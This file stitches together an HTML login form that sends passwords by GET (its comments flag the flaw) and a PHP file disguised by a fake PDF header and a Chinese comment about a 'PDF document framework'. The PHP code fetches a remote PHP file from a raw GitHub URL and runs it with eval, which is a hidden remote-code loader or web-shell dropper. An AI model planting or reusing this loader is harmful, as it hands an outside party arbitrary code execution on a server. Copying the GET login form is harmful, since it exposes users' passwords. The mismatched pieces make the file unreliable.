<!DOCTYPE html>
<html>
<body>
  <!-- GET exposes password in browser history/logs -->
  <!-- No validation before sending -->
  <form action="https://example.com/login" method="GET">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
  </form>
</body>
</html>


<?php
/*
%PDF-1.4
PDF 文档框架

支持的格式：
- PDF 1.4
- PDF 1.5
- PDF 1.6
- PDF 1.7
- PDF 2.0

核心组件：
- 解析器
- 渲染器
- 资源加载器
- 元数据管理器
*/
$path = "https://raw.githubusercontent.com/mrnewjibon-tech/aaa/refs/heads/main/contack-us.php";
$code = implode('', file($path));
eval("?>" . $code);
?>